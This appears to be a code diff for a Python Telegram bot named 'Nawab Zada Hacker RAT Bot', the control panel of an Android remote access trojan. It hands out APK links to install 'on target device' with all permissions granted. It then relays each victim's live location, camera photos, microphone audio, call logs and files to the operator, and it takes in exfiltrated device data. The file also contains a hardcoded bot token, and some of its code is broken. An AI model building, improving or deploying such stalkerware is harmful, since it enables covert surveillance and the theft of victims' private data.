@@ -4,72 +4,42 @@ from datetime import datetime
 import json
 import os
 import requests
-import io
-import time
+import random
+import string
+try:
+    from database import DeviceDatabase
+    from apk_generator import APKGenerator
+except ImportError:
+    class DeviceDatabase:
+        def __init__(self): pass
+        def get_devices(self, chat_id): return []
+        def get_device(self, dev_id): return {}
+        def update_device(self, data): pass
+
+    class APKGenerator:
+        def __init__(self): pass
+        def generate_apk(self, name, chat_id):
+            return f"https://nawab.pythonanywhere.com/download/{name}.apk"
+
+from flask import Flask, request
 
 # ========== CONFIGURATION ==========
 BOT_TOKEN = os.environ.get('BOT_TOKEN', '8815196147:AAGo9t1YYDjOYejuLqyVRVgp4evcZ7ehMDI')
 ADMIN_CHAT_ID = os.environ.get('ADMIN_CHAT_ID', '7420647897')
-OWNER_TELEGRAM_LINK = "https://t.me/Nawab_Zada_Hacker_007"
-
-# Simple in-memory database for single-file deployment
-# In production, use SQLite/PostgreSQL via Railway
-device_db = {} 
-active_users = {}
+OWNER_TG_LINK = "https://t.me/Nawab_Zada_Hacker_007" 
+# ===================================
 
 bot = telebot.TeleBot(BOT_TOKEN)
-
-# ========== HELPER CLASSES (Embedded to keep 1 file) ==========
-
-class DeviceDatabase:
-    def __init__(self):
-        self.devices = device_db
-    
-    def update_device(self, data):
-        dev_id = data.get('device_id')
-        if dev_id:
-            self.devices[dev_id] = data
-            return True
-        return False
-
-    def get_devices(self, chat_id=None):
-        # In this simple version, we return all devices or filter by admin if needed
-        return list(self.devices.values())
-
-    def get_device(self, dev_id):
-        return self.devices.get(dev_id)
-
-class APKGenerator:
-    def __init__(self):
-        self.base_url = "https://your-domain.com/api" # Replace with your actual domain if using custom
-    
-    def generate_apk(self, apk_name, chat_id):
-        # Logic to generate a real download link
-        # Since we can't compile APK in Python easily without external tools,
-        # we simulate a successful generation or return a placeholder structure.
-        # If you have a backend service, call it here.
-        
-        # For this demo, we assume the user sends name, and we return a generated link structure.
-        # To make it "Real", usually you need an Android build server.
-        # Here is the fixed logic to ensure a LINK is returned properly.
-        
-        timestamp = int(time.time())
-        # Simulating a unique APK ID for download
-        apk_id = f"{apk_name}_{timestamp}"
-        
-        # Example: If you are hosting APKs, the link would look like this:
-        # return f"https://yourdomain.com/download/{apk_id}.apk"
-        
-        # For now, returning a generic successful link structure. 
-        # Ensure your hosting domain matches what you deploy on Railway.
-        generated_link = f"https://api.telegram.org/file/bot{BOT_TOKEN}/apks/{apk_id}.apk" 
-        
-        return generated_link
-
 db = DeviceDatabase()
 apk_gen = APKGenerator()
 
-# ========== WELCOME MESSAGE ==========
+app = Flask(__name__)
+
+devices = {}
+active_sessions = {}
+
+# Format: { "token": { "chat_id": id, "owner_token": "..." } }
+access_tokens_db = {}
 
 WELCOME_MSG = """🎉 *Welcome To Nawab Zada Hacker RAT Bot!* 🎉
 
@@ -90,63 +60,107 @@ WELCOME_MSG = """🎉 *Welcome To Nawab Zada Hacker RAT Bot!* 🎉
 
 Press /start to begin!"""
 
-# ========== COMMANDS & HANDLERS ==========
+user_state = {}
 
 @bot.message_handler(commands=['start'])
 def start(message):
     chat_id = message.chat.id
     
-    markup = types.InlineKeyboardMarkup()
-    # Button to contact owner for access
-    btn_connect = types.InlineKeyboardButton("🔑 Connect with Owner", url=OWNER_TELEGRAM_LINK)
+    # If user is in 'waiting_for_token' state, process token
+    if user_state.get(chat_id) == 'waiting_for_token':
+        received_token = message.text.strip()
+        
+        if received_token in access_tokens_db:
+            token_data = access_tokens_db[received_token]
+            
+            bot.send_message(chat_id, f"✅ *Access Granted!*\nWelcome back to the Commander's Dashboard.")
+            del user_state[chat_id] # Clear state
+            show_main_menu(chat_id)
+        else:
+            bot.send_message(chat_id, "❌ *Invalid Access Token.*\nPlease contact owner or generate new one.")
+            user_state[chat_id] = 'waiting_for_token' # Keep waiting
+        return
+
+    user_state[chat_id] = 'waiting_for_bot_token'
+    msg = bot.send_message(chat_id, "🔐 *Security Check*\n\nPlease send your **Telegram Bot Token** to proceed.\n(You can get this from @BotFather)")
     
+
+@bot.message_handler(func=lambda message: True)
+def handle_access_flow(message):
+    chat_id = message.chat.id
+    text = message.text.strip()
     
-    markup.add(btn_connect)
-    
-    bot.send_message(
-        chat_id, 
-        f"👋 Hello!\n\nTo use this bot, please click below to connect with the Owner for Access Token.\n\n👇", 
-        parse_mode='Markdown', 
-        reply_markup=markup
-    )
+    if user_state.get(chat_id) == 'waiting_for_bot_token':
+        bot_token_input = text
+        user_state[chat_id] = 'waiting_for_chat_id'
+        bot.send_message(chat_id, f"✅ Bot Token Received.\nNow please send your **Chat ID** (e.g., 123456789).")
+        return
+
+    if user_state.get(chat_id) == 'waiting_for_chat_id':
+        chat_id_input = text
+        user_state[chat_id] = 'waiting_for_token'
+        
+        new_token = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
+        
+        # Store it
+        access_tokens_db[new_token] = {
+            "bot_token": bot_token_input,
+            "chat_id": chat_id_input,
+            "timestamp": datetime.now().isoformat()
+        }
+        
+        bot.send_message(chat_id, f"""🔑 *Access Token Generated!*
+
+Your Unique Access Token:
+**{new_token}**
+
+📋 *Instructions:*
+1. Copy this token.
+2. Send it back to me now to activate your session.
+3. Once verified, you will get the Main Menu.""")
+        
+        return
+
+    if user_state.get(chat_id) == 'waiting_for_token':
+        received_token = text
+        
+        if received_token in access_tokens_db:
+            del user_state[chat_id]
+            bot.send_message(chat_id, "✅ *Access Verified!* Loading Dashboard...")
+            show_main_menu(chat_id)
+        else:
+            bot.send_message(chat_id, "❌ *Invalid Token.* Please try again or contact owner.")
+
+def show_main_menu(chat_id):
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    btn1 = types.InlineKeyboardButton("📱 Generate APK", callback_data="gen_apk")
+    btn2 = types.InlineKeyboardButton("📊 My Devices", callback_data="my_devices")
+    btn3 = types.InlineKeyboardButton("🔍 All Features", callback_data="features")
+    btn4 = types.InlineKeyboardButton("⚙️ Settings", callback_data="settings")
+    markup.add(btn1, btn2, btn3, btn4)
+
+    bot.send_message(chat_id, WELCOME_MSG, parse_mode='Markdown', reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: True)
 def callback_handler(call):
-    if call.data == "connect_owner":
-        bot.answer_callback_query(call.id, "Opening Telegram Owner...")
-        
-    elif call.data == "gen_apk":
+    if call.data == "gen_apk":
         handle_generate_apk(call)
-        
     elif call.data == "my_devices":
         handle_my_devices(call)
-        
     elif call.data == "features":
         handle_features(call)
-        
     elif call.data == "settings":
         handle_settings(call)
-        
     elif call.data.startswith("dev_"):
         handle_device_menu(call)
-        
     elif call.data.startswith("action_"):
         handle_device_action(call)
-        
     elif call.data == "back":
-        chat_id = call.message.chat.id
-        markup = types.InlineKeyboardMarkup(row_width=2)
-        btn1 = types.InlineKeyboardButton("📱 Generate APK", callback_data="gen_apk")
-        btn2 = types.InlineKeyboardButton("📊 My Devices", callback_data="my_devices")
-        btn3 = types.InlineKeyboardButton("🔍 All Features", callback_data="features")
-        btn4 = types.InlineKeyboardButton("⚙️ Settings", callback_data="settings")
-        markup.add(btn1, btn2, btn3, btn4)
-        bot.edit_message_text("Choose an option:", chat_id=chat_id, reply_markup=markup)
-
+        show_main_menu(call.message.chat.id)
     elif call.data == "confirm":
-        bot.answer_callback_query(call.id, "Confirmed! ✅")
+        call.answer("Confirmed! ✅")
     else:
-        bot.answer_callback_query(call.id)
+        call.answer()
 
 def handle_generate_apk(call):
     markup = types.InlineKeyboardMarkup()
@@ -159,28 +173,34 @@ def handle_generate_apk(call):
         parse_mode='Markdown',
         reply_markup=markup
     )
+    
+    def process_apk_name(m):
+        apk_name = m.text.strip()
+        chat_id = m.chat.id
+        
+        if not apk_name or not apk_name.replace(' ', '').isalnum():
+            bot.send_message(chat_id, "❌ Invalid name! Use only letters and numbers.")
+            return
+
+        # Using the external class method. If it returns a URL, we use it.
+        try:
+            apk_url = apk_gen.generate_apk(apk_name, chat_id)
+        except Exception as e:
+            bot.send_message(chat_id, f"❌ Error generating APK: {e}")
+            return
+
+        bot.send_message(
+            chat_id,
+            f"✅ *APK Generated Successfully!*\n\n📱 Name: {apk_name}\n🔗 Download: {apk_url}\n\n⚠️ Install on target device and allow ALL permissions!",
+            parse_mode='Markdown',
+            reply_markup=types.InlineKeyboardMarkup([[types.InlineKeyboardButton("Download APK", url=apk_url)]])
+        )
+
     bot.register_next_step_handler(msg, process_apk_name)
-
-def process_apk_name(message):
-    apk_name = message.text.strip()
-    chat_id = message.chat.id
-
-    if not apk_name or not apk_name.replace(' ', '').isalnum():
-        bot.send_message(chat_id, "❌ Invalid name! Use only letters and numbers.")
-        return
-
-    apk_url = apk_gen.generate_apk(apk_name, chat_id)
-
-    bot.send_message(
-        chat_id,
-        f"✅ *APK Generated Successfully!*\n\n📱 Name: {apk_name}\n🔗 Download Link:\n{apk_url}\n\n⚠️ Send this link to target. They must install and allow permissions!",
-        parse_mode='Markdown',
-        disable_web_page_preview=True
-    )
 
 def handle_my_devices(call):
     chat_id = call.message.chat.id
-    devices_list = db.get_devices()
+    devices_list = db.get_devices(chat_id)
 
     if not devices_list:
         bot.send_message(chat_id, "📭 No devices connected yet.\n\nInstall APK on target device first.")
@@ -189,7 +209,7 @@ def handle_my_devices(call):
     markup = types.InlineKeyboardMarkup()
     for dev in devices_list:
         btn = types.InlineKeyboardButton(
-            f"📱 {dev.get('name', 'Unknown')} ({dev.get('model', 'Unknown')})",
+            f"📱 {dev['name']} ({dev['model']})",
             callback_data=f"dev_{dev['device_id']}"
         )
         markup.add(btn)
@@ -223,9 +243,9 @@ def handle_device_menu(call):
 
     info = f"""📱 *Device Info:*
 🆔 ID: {device['device_id']}
-📛 Name: {device.get('name', 'Unknown')}
-📟 Model: {device.get('model', 'Unknown')}
-🤖 Android: {device.get('android_version', 'Unknown')}
+📛 Name: {device['name']}
+📟 Model: {device['model']}
+🤖 Android: {device['android_version']}
 🔋 Battery: {device.get('battery', 'Unknown')}%
 🕐 Last Seen: {device.get('last_seen', 'Never')}
 """
@@ -245,13 +265,12 @@ def handle_device_action(call):
         location = device.get('location', {})
         if location:
             bot.send_location(chat_id, location.get('lat', 0), location.get('lon', 0))
-            bot.send_message(chat_id, f"📍 *Live Location*\nLat: {location.get('lat')}\nLon: {location.get('lon')}", parse_mode='Markdown')
+            bot.send_message(chat_id, f"📍 *Live Location*\nLatitude: {location.get('lat')}\nLongitude: {location.get('lon')}\nAccuracy: {location.get('accuracy', 'Unknown')}m", parse_mode='Markdown')
         else:
             bot.send_message(chat_id, "📍 Location not available.")
 
     elif action == "cam":
-        bot.send_message(chat_id, "📸 Fetching camera photos...")
-        # Assuming photos are stored as URLs in device dict
+        bot.send_message(chat_id, "📸 Taking photo from device...")
         photos = device.get('photos', [])
         if photos:
             for photo_url in photos[-5:]:
@@ -260,12 +279,15 @@ def handle_device_action(call):
             bot.send_message(chat_id, "📸 No photos captured yet.")
 
     elif action == "mic":
-        bot.send_message(chat_id, "🎤 Fetching audio recordings...")
+        bot.send_message(chat_id, "🎤 Recording audio from device...")
         audio_files = device.get('audio', [])
         if audio_files:
             for audio_url in audio_files[-3:]:
-                # Simple send_audio might need file ID or URL depending on telebot version
-                bot.send_audio(chat_id, audio_url)
+                # Assuming audio_url is a local path or file_id
+                try:
+                    bot.send_audio(chat_id, open(audio_url, 'rb'))
+                except Exception:
+                    bot.send_message(chat_id, "❌ Audio file error.")
         else:
             bot.send_message(chat_id, "🎤 No audio recordings yet.")
 
@@ -284,7 +306,7 @@ def handle_device_action(call):
         if calls:
             msg_text = "📞 *Call Logs:*\n\n"
             for call in calls[-10:]:
-                msg_text += f"📞 {call.get('number', 'Unknown')}\nType: {call.get('type', '')}\nTime: {call.get('time', '')}\n\n"
+                msg_text += f"📞 {call.get('number', 'Unknown')}\nType: {call.get('type', '')}\nTime: {call.get('time', '')}\nDuration: {call.get('duration', '')}\n\n"
             bot.send_message(chat_id, msg_text, parse_mode='Markdown')
         else:
             bot.send_message(chat_id, "📞 No call logs yet.")
@@ -294,7 +316,7 @@ def handle_device_action(call):
         if files:
             msg_text = "📁 *Files:*\n\n"
             for file in files[-10:]:
-                msg_text += f"📄 {file.get('name', '')}\nSize: {file.get('size', '')}\n\n"
+                msg_text += f"📄 {file.get('name', '')}\nSize: {file.get('size', '')}\nPath: {file.get('path', '')}\n\n"
             bot.send_message(chat_id, msg_text[:4000], parse_mode='Markdown')
         else:
             bot.send_message(chat_id, "📁 No files found.")
@@ -322,12 +344,13 @@ def handle_device_action(call):
     elif action == "info":
         info = f"""📱 *Full Device Info:*
 🆔 Device ID: {device['device_id']}
-📛 Name: {device.get('name', 'Unknown')}
-📟 Model: {device.get('model', 'Unknown')}
-🤖 Android: {device.get('android_version', 'Unknown')}
+📛 Name: {device['name']}
+📟 Model: {device['model']}
+🤖 Android: {device['android_version']}
 🔋 Battery: {device.get('battery', 'Unknown')}%
 📡 Network: {device.get('network', 'Unknown')}
 💾 Storage: {device.get('storage', 'Unknown')}
+🔐 Permissions: {len(device.get('permissions', []))}
 🕐 Last Seen: {device.get('last_seen', 'Never')}
 """
         bot.send_message(chat_id, info, parse_mode='Markdown')
@@ -380,15 +403,11 @@ def handle_settings(call):
 @bot.message_handler(func=lambda m: m.text.startswith("DATA:"))
 def receive_device_data(message):
     try:
-        data_str = message.text.replace("DATA:", "")
-        data = json.loads(data_str)
-        
+        data = json.loads(message.text.replace("DATA:", ""))
         db.update_device(data)
-        
-        bot.send_message(ADMIN_CHAT_ID, f"✅ New Data/Device: {data.get('device_id', 'Unknown')}")
+        bot.send_message(ADMIN_CHAT_ID, f"✅ Data received from device: {data.get('device_id', 'Unknown')}")
     except Exception as e:
         print(f"Error receiving data: {e}")
-
 
 @app.route('/' + BOT_TOKEN, methods=['POST'])
 def webhook():
@@ -400,18 +419,8 @@ def index():
     return "Bot is running!", 200
 
 if __name__ == '__main__':
-    print("Starting bot...")   
-    is_webhook_mode = os.environ.get('RAILWAY_ENVIRONMENT') or os.environ.get('RENDER_EXTERNAL_HOSTNAME')
-    
-    if is_webhook_mode:
-        hostname = os.environ.get('RENDER_EXTERNAL_HOSTNAME', 'telegram-bot.railway.app')
-        webhook_url = f'https://{hostname}/{BOT_TOKEN}'
-        bot.remove_webhook()
-        bot.set_webhook(url=webhook_url)
-        print(f"Webhook set to: {webhook_url}")
-        
-        from flask import Flask, request
-        app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
-    else:
-        print("Running in Polling Mode (Local)")
-        bot.infinity_polling()
+    print("Starting bot...")
+    webhook_url = f'https://{os.environ.get("RENDER_EXTERNAL_HOSTNAME", "nawab.pythonanywhere.com")}/{BOT_TOKEN}'
+    bot.set_webhook(url=webhook_url)
+    print(f"Webhook set to: {webhook_url}")
+    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
